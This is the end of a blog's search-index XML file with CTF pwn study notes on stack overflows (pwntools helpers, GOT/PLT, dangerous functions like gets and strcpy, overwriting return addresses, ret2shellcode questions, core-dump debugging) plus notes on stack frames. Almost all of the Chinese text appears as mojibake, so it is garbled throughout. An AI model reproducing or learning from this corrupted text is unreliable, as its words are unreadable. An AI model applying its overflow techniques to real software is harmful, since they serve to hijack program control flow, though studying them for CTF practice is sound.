7.p32ï¼ˆï¼‰ï¼Œå°†æ‹¬å·å†…çš„æ•°è½¬æ¢ä¸ºæœºå™¨ç ã€‚u32ï¼ˆï¼‰ï¼Œå°†æ‹¬å·å†…çš„æœºå™¨ç è½¬åŒ–ä¸ºå­—ç¬¦æˆ–è€…æ•°å­—ã€‚ 8.gdbè°ƒè¯•å¯»æ‰¾å­—ç¬¦ä¸²å‘½ä»¤ï¼šfind+èµ·å§‹åœ°å€+é•¿åº¦+â€œå­—ç¬¦ä¸²â€,å¦‚ï¼šfind 0xb7e393f0, +2200000, â€œ/bin/shâ€ã€‚ 9.readå‡½æ•°ï¼ˆï¼‰ï¼Œä»Žæ‰“å¼€çš„è®¾å¤‡æˆ–è€…æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚ssize_t read(int fd, void *buf, size_t count);countæ˜¯è¯·æ±‚è¯»å–çš„å­—èŠ‚æ•°ï¼Œè¯»å–çš„æ•°æ®ä¿å­˜åœ¨ç¼“å†²åŒºbufä¸­ï¼ŒåŒæ—¶æ–‡ä»¶çš„å½“å‰è¯»å†™ä½ç½®åŽç§»ã€‚è¿”å›žå€¼æ˜¯æˆåŠŸè¯»å–çš„å­—èŠ‚æ•°ï¼›writeå‡½æ•°ï¼Œä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸º(int fdï¼Œconst void *bufï¼Œsize_t nbyte)åˆ†åˆ«ä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼ŒæŒ‡å®šçš„ç¼“å†²åŒºï¼ˆæŒ‡å‘ä¸€æ®µå†…å­˜å•å…ƒçš„æŒ‡é’ˆï¼‰å’Œè¦å†™å…¥æ–‡ä»¶çš„å­—èŠ‚æ•°ã€‚ 10.GOTå®šä½ï¼šå¯¹äºŽæ¨¡å—å¤–éƒ¨å¼•ç”¨çš„å…¨å±€å˜é‡å’Œå…¨å±€å‡½æ•°ï¼Œç”¨ GOT è¡¨çš„è¡¨é¡¹å†…å®¹ä½œä¸ºåœ°å€æ¥é—´æŽ¥å¯»å€ï¼›å¯¹äºŽæœ¬æ¨¡å—å†…çš„é™æ€å˜é‡å’Œé™æ€å‡½æ•°ï¼Œç”¨ GOT è¡¨çš„é¦–åœ°å€ä½œä¸ºä¸€ä¸ªåŸºå‡†ï¼Œç”¨ç›¸å¯¹äºŽè¯¥åŸºå‡†çš„åç§»é‡æ¥å¼•ç”¨ï¼Œå› ä¸ºä¸è®ºç¨‹åºè¢«åŠ è½½åˆ°ä½•ç§åœ°å€ç©ºé—´ï¼Œæ¨¡å—å†…çš„é™æ€å˜é‡å’Œé™æ€å‡½æ•°ä¸Ž GOT çš„è·ç¦»æ˜¯å›ºå®šçš„ï¼Œå¹¶ä¸”åœ¨é“¾æŽ¥é˜¶æ®µå°±å¯çŸ¥æ™“å…¶è·ç¦»çš„å¤§å°ã€‚è¿™æ ·ï¼ŒPIC ä½¿ç”¨ GOT æ¥å¼•ç”¨å˜é‡å’Œå‡½æ•°çš„ç»å¯¹åœ°å€ï¼ŒæŠŠä½ç½®ç‹¬ç«‹çš„å¼•ç”¨é‡å®šå‘åˆ°ç»å¯¹ä½ç½®ã€‚ PLTè¡¨ï¼šè¿‡ç¨‹é“¾æŽ¥è¡¨ç”¨äºŽæŠŠä½ç½®ç‹¬ç«‹çš„å‡½æ•°è°ƒç”¨é‡å®šå‘åˆ°ç»å¯¹ä½ç½®ã€‚é€šè¿‡ PLT åŠ¨æ€é“¾æŽ¥çš„ç¨‹åºæ”¯æŒæƒ°æ€§ç»‘å®šæ¨¡å¼ã€‚æ¯ä¸ªåŠ¨æ€é“¾æŽ¥çš„ç¨‹åºå’Œå…±äº«åº“éƒ½æœ‰ä¸€ä¸ª PLTï¼ŒPLT è¡¨çš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€å°æ®µä»£ç ï¼Œå¯¹åº”äºŽæœ¬è¿è¡Œæ¨¡å—è¦å¼•ç”¨çš„ä¸€ä¸ªå…¨å±€å‡½æ•°ã€‚ç¨‹åºå¯¹æŸä¸ªå‡½æ•°çš„è®¿é—®éƒ½è¢«è°ƒæ•´ä¸ºå¯¹ PLT å…¥å£çš„è®¿é—®ã€‚ 11.å†…å­˜å››åŒºï¼Œä¸€ä¸ªç”±c/C++ç¼–è¯‘çš„ç¨‹åºå ç”¨çš„å†…å­˜åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š1.æ ˆåŒºï¼ˆstackï¼‰ï¼šç”±ç¼–è¯‘å™¨è‡ªåŠ¨åˆ†é…é‡Šæ”¾ ï¼Œå­˜æ”¾å‡½æ•°çš„å‚æ•°å€¼ï¼Œå±€éƒ¨å˜é‡çš„å€¼ç­‰ã€‚å…¶æ“ä½œæ–¹å¼ç±»ä¼¼äºŽæ•°æ®ç»“æž„ä¸­çš„æ ˆã€‚2.å †åŒºï¼ˆheap)ï¼š ä¸€èˆ¬ç”±ç¨‹åºå‘˜åˆ†é…é‡Šæ”¾ï¼Œ è‹¥ç¨‹åºå‘˜ä¸é‡Šæ”¾ï¼Œç¨‹åºç»“æŸæ—¶å¯èƒ½ç”±OSå›ž æ”¶ ã€‚æ³¨æ„å®ƒä¸Žæ•°æ®ç»“æž„ä¸­çš„å †æ˜¯ä¸¤å›žäº‹ï¼Œåˆ†é…æ–¹å¼å€’æ˜¯ç±»ä¼¼äºŽé“¾è¡¨ã€‚3.æ•°æ®åŒºï¼šä¸»è¦åŒ…æ‹¬é™æ€å…¨å±€åŒºå’Œå¸¸é‡åŒºã€‚å¦‚æžœè¦ç«™åœ¨æ±‡ç¼–è§’åº¦ç»†åˆ†çš„è¯è¿˜å¯ä»¥åˆ†ä¸ºå¾ˆå¤šå°çš„åŒºã€‚å…¨å±€åŒºï¼ˆé™æ€åŒºï¼‰ï¼ˆstaticï¼‰ï¼šå…¨å±€å˜é‡å’Œé™æ€å˜é‡çš„å­˜å‚¨æ˜¯æ”¾åœ¨ä¸€å—çš„ï¼Œåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡åœ¨ä¸€å—åŒºåŸŸï¼Œ æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œæœªåˆå§‹åŒ–çš„é™æ€å˜é‡åœ¨ç›¸é‚»çš„å¦ä¸€å—åŒºåŸŸï¼Œç¨‹åºç»“æŸåŽç”±ç³»ç»Ÿé‡Šæ”¾ã€‚å¸¸é‡åŒº ï¼šå¸¸é‡å­—ç¬¦ä¸²å°±æ˜¯æ”¾åœ¨è¿™é‡Œçš„ã€‚ ç¨‹åºç»“æŸåŽç”±ç³»ç»Ÿé‡Šæ”¾4.ä»£ç åŒºï¼šå­˜æ”¾å‡½æ•°ä½“çš„äºŒè¿›åˆ¶ä»£ç ã€‚ 12.éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºŽåœ¨è®¡ç®—æœºå†…å­˜ä¸­ï¼Œæ¯ä¸ªå€¼éƒ½æ˜¯æŒ‰ç…§å­—èŠ‚å­˜å‚¨çš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯é‡‡ç”¨å°ç«¯å­˜å‚¨ï¼Œå³ 0x0804843B åœ¨å†…å­˜ä¸­çš„å½¢å¼æ˜¯ 1\x3b\x84\x04\x08 ä½†æ˜¯ï¼Œæˆ‘ä»¬åˆä¸èƒ½ç›´æŽ¥åœ¨ç»ˆç«¯å°†è¿™äº›å­—ç¬¦ç»™è¾“å…¥è¿›åŽ»ï¼Œåœ¨ç»ˆç«¯è¾“å…¥çš„æ—¶å€™ \ï¼Œx ç­‰ä¹Ÿç®—ä¸€ä¸ªå•ç‹¬çš„å­—ç¬¦ã€‚ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠžæ³•å°† \x3b ä½œä¸ºä¸€ä¸ªå­—ç¬¦è¾“å…¥è¿›åŽ»ã€‚é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ä¸€æ³¢ pwntools äº†ã€‚ 13.å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹ è¾“å…¥ getsï¼Œç›´æŽ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥â€™\x00â€™ scanf vscanf è¾“å‡º sprintf å­—ç¬¦ä¸² strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ°â€™\x00â€™åœæ­¢ strcatï¼Œå­—ç¬¦ä¸²æ‹¼æŽ¥ï¼Œé‡åˆ°â€™\x00â€™åœæ­¢ bcopy è®¡ç®—æˆ‘ä»¬æ‰€è¦æ“ä½œçš„åœ°å€ä¸Žæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€çš„è·ç¦»ã€‚å¸¸è§çš„æ“ä½œæ–¹æ³•å°±æ˜¯æ‰“å¼€ IDAï¼Œæ ¹æ®å…¶ç»™å®šçš„åœ°å€è®¡ç®—åç§»ã€‚ä¸€èˆ¬å˜é‡ä¼šæœ‰ä»¥ä¸‹å‡ ç§ç´¢å¼•æ¨¡å¼ ç›¸å¯¹äºŽæ ˆåŸºåœ°å€çš„çš„ç´¢å¼•ï¼Œå¯ä»¥ç›´æŽ¥é€šè¿‡æŸ¥çœ‹ EBP ç›¸å¯¹åç§»èŽ·å¾— ç›¸å¯¹åº”æ ˆé¡¶æŒ‡é’ˆçš„ç´¢å¼•ï¼Œä¸€èˆ¬éœ€è¦è¿›è¡Œè°ƒè¯•ï¼Œä¹‹åŽè¿˜æ˜¯ä¼šè½¬æ¢åˆ°ç¬¬ä¸€ç§ç±»åž‹ã€‚ ç›´æŽ¥åœ°å€ç´¢å¼•ï¼Œå°±ç›¸å½“äºŽç›´æŽ¥ç»™å®šäº†åœ°å€ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šæœ‰å¦‚ä¸‹çš„è¦†ç›–éœ€æ±‚ è¦†ç›–å‡½æ•°è¿”å›žåœ°å€ï¼Œè¿™æ—¶å€™å°±æ˜¯ç›´æŽ¥çœ‹ EBP å³å¯ã€‚ è¦†ç›–æ ˆä¸ŠæŸä¸ªå˜é‡çš„å†…å®¹ï¼Œè¿™æ—¶å€™å°±éœ€è¦æ›´åŠ ç²¾ç»†çš„è®¡ç®—äº†ã€‚ è¦†ç›– bss æ®µæŸä¸ªå˜é‡çš„å†…å®¹ã€‚ æ ¹æ®çŽ°å®žæ‰§è¡Œæƒ…å†µï¼Œè¦†ç›–ç‰¹å®šçš„å˜é‡æˆ–åœ°å€çš„å†…å®¹ã€‚ ä¹‹æ‰€ä»¥æˆ‘ä»¬æƒ³è¦è¦†ç›–æŸä¸ªåœ°å€ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æƒ³é€šè¿‡è¦†ç›–åœ°å€çš„æ–¹æ³•æ¥ç›´æŽ¥æˆ–è€…é—´æŽ¥åœ°æŽ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚ 0X06â€“å°šå­˜åœ¨çš„é—®é¢˜: 1.å…³äºŽret2shellcodeæ˜¯å¦‚ä½•æ‰§è¡Œçš„ã€‚RWX,bssæ®µå…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œå³NXå¼€æ²¡å¼€æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Œçœ‹ä¸åˆ°åŒºåˆ«ã€‚ 2.ESPçš„è°ƒè¯•ä¸ºä»€ä¹ˆæ–­ç‚¹ä¸‹åœ¨CALLå¤„ã€‚ 3.bufä¸¤ç«¯çš„é—®é¢˜ã€‚ 4.å…³äºŽshellcodeçš„ä½ç½®é—®é¢˜ï¼šæ­£å¸¸æƒ…å†µä¸‹éƒ½æ˜¯ä½¿ç”¨gdsè°ƒè¯•ç¨‹åºï¼Œç„¶åŽæŸ¥çœ‹å†…å­˜æ¥ç¡®å®šshellcodeçš„ä¸ºä¹‹ã€‚ä½†å®žé™…ä¸Šæ‰§è¡Œexpçš„æ—¶å€™ä¼šå‘çŽ°shellcodeä¸åœ¨è¿™ä¸ªä½ç½®ä¸Šï¼Œå› ä¸ºgdbçš„è°ƒè¯•çŽ¯å¢ƒä¼šå½±å“bufåœ¨å†…å­˜ä¸­çš„ä½ç½®ã€‚å…³é—­ALSRåªèƒ½ä¿è¯bufçš„åœ°å€åœ¨gdbçš„è°ƒè¯•çŽ¯å¢ƒä¸­ä¸å˜ï¼Œä½†æ˜¯ç›´æŽ¥æ‰§è¡Œelfæ—¶ï¼Œbufçš„ä½ç½®ä¼šå›ºå®šåœ¨åˆ«çš„åœ°å€ä¸Šã€‚è§£å†³æ­¤é—®é¢˜æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯å¼€å¯core dumpåŠŸèƒ½ï¼Œå³ï¼šulimit -c unlimitedsudo sh -c â€˜echo â€œ/tmp/core.%tâ€ &gt; /proc/sys/kernel/core_patternâ€™å¼€å¯ä¹‹åŽï¼Œå½“å‡ºçŽ°å†…å­˜é”™è¯¯çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šç”Ÿæˆä¸€ä¸ªcore dumpæ–‡ä»¶åœ¨tmpç›®å½•ä¸‹ã€‚ç„¶åŽæˆ‘ä»¬å†ç”¨gdbæŸ¥çœ‹è¿™ä¸ªcoreæ–‡ä»¶å°±å¯ä»¥èŽ·å–åˆ°bufçœŸæ­£çš„åœ°å€äº†ã€‚ CTF-Wiki&gt;Linux Pwn: Stack Overflow principle Basic ROP ç³»ç»Ÿè°ƒç”¨ Githubä¸ŠLibcç‰ˆæœ¬åº“ LibcSearcherå·¥å…· çŽ°ä»£æ ˆæº¢å‡ºåˆ©ç”¨æŠ€æœ¯åŸºç¡€ï¼šROP ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x86ç¯‡ ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x64ç¯‡ æ‰‹æŠŠæ‰‹æ•™ä½ æ ˆæº¢å‡ºä»Žå…¥é—¨åˆ°æ”¾å¼ƒï¼ˆä¸Šï¼‰ æ‰‹æŠŠæ‰‹æ•™ä½ æ ˆæº¢å‡ºä»Žå…¥é—¨åˆ°æ”¾å¼ƒï¼ˆä¸‹ï¼‰ Linuxä¸‹pwnä»Žå…¥é—¨åˆ°æ”¾å¼ƒ]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>CTF Pwn stackoverflow ROP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ ˆå¸§ï¼ˆstack frameï¼‰]]></title>
    <url>%2F2019%2F06%2F19%2FStack%20Frame%2F</url>
    <content type="text"><![CDATA[1.æ ˆå¸§çš„ä½œç”¨ï¼šåœ¨ç¨‹åºä¸­ç”¨äºŽå£°æ˜Žå˜é‡ï¼Œè°ƒç”¨å‡½æ•°ã€‚æ˜¯åˆ©ç”¨EBPï¼ˆæ ˆå¸§æŒ‡é’ˆï¼‰å¯„å­˜å™¨è®¿é—®æ ˆå†…å±€éƒ¨å˜é‡ï¼Œå‚æ•°ï¼Œå‡½æ•°è¿”å›žåœ°å€ç­‰çš„æ‰‹æ®µã€‚ 2.åœ¨å‚¨å­˜å±€éƒ¨å˜é‡çš„å€¼ä¹‹å‰ï¼Œéƒ½ä¼šæ‰§è¡ŒSUBæŒ‡ä»¤ï¼Œä¸ºå±€éƒ¨å˜é‡å¼€è¾Ÿç©ºé—´ã€‚ 3.æ±‡ç¼–ä¸­çš„DWORD PTR SS:[EBP-4]ç†è§£ä¸ºæŒ‡é’ˆï¼Œæ„ä¸ºåœ°å€EBP-4å¤„æœ‰ä¸€ä¸ª4å­—èŠ‚å¤§å° çš„å†…å­˜ç©ºé—´ã€‚æ­¤å¥ä¸­ï¼ŒSSæ˜¯Segment Memory Modelçš„ç¼©å†™ï¼Œè¡¨ç¤ºæ ˆæ®µï¼Œåœ¨Windowsï¼ˆä½¿ç”¨æ®µå†…å­˜æ¨¡åž‹ï¼‰ä¸‹éœ€è¦æŒ‡å‡ºã€‚EBPæ˜¯æŒ‡å‘æ ˆçš„å¯„å­˜å™¨ï¼Œæ‰€ä»¥åŠ ä¸ŠSSå¯„å­˜å™¨ã€‚DWORD PTRä¸ŽSSç­‰å­—ç¬¦ä¸²å¯ä»¥åœ¨ODè®¾ç½®ä¸­éšè—ã€‚ 4.è°ƒç”¨ä¸€ä¸ªå‡½æ•°ä¹‹å‰ï¼Œå…ˆå¼€è¾Ÿå‡ºå†…å­˜ç©ºé—´ï¼Œåœ¨å°†å‚æ•°åŽ‹å…¥æ ˆï¼Œæœ€åŽåœ¨æ‰§è¡Œå‡½æ•°ä¹‹å‰ï¼Œå°†è¿”å›žåœ°å€åŽ‹å…¥æ ˆã€‚æ‰§è¡Œå®Œæ¯•ä¹‹åŽå°†åˆ é™¤å‡½æ•°æ ˆå¸§å¹¶è¿”å›žè‡³PUSHçš„è¿”å›žåœ°å€ã€‚ 5.æ³¨æ„å‚æ•°å…¥æ ˆçš„é¡ºåºä¸ŽCè¯­è¨€ä¸­å‚æ•°é¡ºåºæ°å¥½ç›¸åï¼ˆå‚æ•°çš„é€†å‘å­˜å‚¨ï¼‰ã€‚ 6.è°ƒç”¨çº¦å®šï¼ˆCalling Conventionï¼‰ï¼šè¢«è°ƒå‡½æ•°æ‰§è¡Œå®ŒåŽï¼Œç”±å‡½æ•°çš„è°ƒç”¨è€…è´Ÿè´£æ¸…ç†å­˜å‚¨åœ¨æ ˆä¸­çš„å‚æ•°ï¼Œè¿™ç§æ–¹å¼ç§°ä¸ºcdeclæ–¹å¼ã€‚ç”±è¢«è°ƒç”¨è€…è´Ÿè´£æ¸…ç†ä¿å­˜åœ¨æ ˆä¸­çš„å‚æ•°ï¼Œç§°ä¸ºstdcallæ–¹å¼ã€‚ 7.ESPä¸ºæ ˆé¡¶æŒ‡é’ˆï¼ŒEBPä¸ºæ ˆå¸§æŒ‡é’ˆã€‚ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼ŒESPæ˜¯éšæ—¶å˜åŒ–çš„ï¼Œè®¿é—®å†…å­˜ä¸­çš„å±€éƒ¨å˜é‡å’Œå‚æ•°ç­‰å¦‚æžœä»¥æ­¤ä¸ºåŸºå€ä¼šååˆ†å›°éš¾ã€‚æ‰€ä»¥ç¨‹åºå¼€å§‹æ—¶ä¼šPUSH EBP,MOV EBP,ESP.å°†ESPçš„å€¼ä¿å­˜åœ¨EBPä¸­å¹¶ä¸”ç»´æŒåœ¨å‡½æ•°å†…éƒ¨ï¼Œè¿™æ ·æ— è®ºESPå¦‚ä½•å˜åŒ–ï¼Œä»¥EBPä¸ºåŸºå‡†éƒ½èƒ½å‡†ç¡®åœ°è®¿é—®åˆ°å±€éƒ¨å˜é‡ä¸Žå‚æ•°ã€‚æ‰§è¡Œå®Œè¿™ä¸¤æ¡å‘½ä»¤ï¼Œå°±å¯ä»¥è¯´æ ˆå¸§å·²ç»ç”Ÿæˆäº†ã€‚ 8.XORå‘½ä»¤ç”¨æ¥è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼ŒExclusive OR bitï¼Œå…¶ç‰¹ç‚¹ä¸ºä¸¤ä¸ªç›¸åŒçš„å€¼è¿›è¡Œå¼‚æˆ–è¿ç®—çš„ç»“æžœä¸º0.XORå‘½ä»¤çš„æ‰§è¡Œé€Ÿåº¦æ¯” MOV EAX,0 è¦å¿«ï¼Œå¸¸ç”¨äºŽå¯„å­˜å™¨åˆå§‹åŒ–æ“ä½œã€‚ 9.ç¼–è¯‘å™¨ä¸­çš„â€ä¼˜åŒ–â€œï¼ˆoptimizationï¼‰é€‰é¡¹å¼€å¯åŽï¼Œç¼–è¯‘å‡ºæ¥çš„ç®€å•å‡½æ•°å°†ä¸ä¼šç”Ÿæˆæ ˆå¸§ã€‚ 10.ç‰¢è®°ï¼šæ ˆæ˜¯ç”¨æ¥å­˜æ”¾å‚æ•°ï¼Œå˜é‡ï¼Œåœ°å€ç­‰æ•°æ®çš„ï¼Œä¸æ˜¯ç”¨æ¥å­˜æ”¾ä»£ç çš„ã€‚]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn function</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Genesis]]></title>
    <url>%2F2019%2F06%2F17%2FGenesis%2F</url>
    <content type="text"><![CDATA[Earthquake and Blog]]></content>
  </entry>
</search>
